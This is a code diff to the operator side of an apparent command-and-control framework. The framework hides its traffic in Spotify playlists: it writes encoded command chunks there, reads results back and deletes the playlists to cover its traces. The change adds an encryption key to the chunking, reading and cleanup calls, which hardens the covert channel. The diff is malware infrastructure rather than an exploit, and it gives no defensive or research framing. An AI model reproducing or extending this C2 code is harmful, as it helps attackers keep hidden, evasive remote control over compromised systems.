@@ -65,7 +65,9 @@ class Operator:
 
         msg = proto.C2Message(module=module, seq=seq, args=args or {})
         encoded = proto.encode_message(msg.to_command_dict(), self.key)
-        chunks = proto.chunk_payload(encoded, seq, proto.CHANNEL_CMD)
+        chunks = proto.chunk_payload(
+            encoded, seq, proto.CHANNEL_CMD, self.key
+        )
         self.spotify.write_c2_playlists(chunks)
         self.pending_seqs[seq] = module
         print(f"[*] Command queued: seq={seq} module={module}")
@@ -78,7 +80,8 @@ class Operator:
             Dict mapping seq -> decoded result dict.
         """
         seq_groups = self.spotify.read_c2_playlists(
-            channel=proto.CHANNEL_RES
+            channel=proto.CHANNEL_RES,
+            encryption_key=self.key,
         )
         results = {}
         for seq_num, chunk_metas in seq_groups.items():
@@ -87,7 +90,7 @@ class Operator:
                 result = proto.decode_message(payload, self.key)
                 results[seq_num] = result
                 self.spotify.clean_c2_playlists(
-                    proto.CHANNEL_RES, seq=seq_num
+                    proto.CHANNEL_RES, self.key, seq=seq_num
                 )
                 self.pending_seqs.pop(seq_num, None)
             except Exception as err:
@@ -119,8 +122,12 @@ class Operator:
 
     def clean_all(self):
         """Remove all C2 playlists from both channels."""
-        self.spotify.clean_c2_playlists(proto.CHANNEL_CMD)
-        self.spotify.clean_c2_playlists(proto.CHANNEL_RES)
+        self.spotify.clean_c2_playlists(
+            proto.CHANNEL_CMD, self.key
+        )
+        self.spotify.clean_c2_playlists(
+            proto.CHANNEL_RES, self.key
+        )
         print("[*] All C2 playlists cleaned")
 
     def interactive(self):
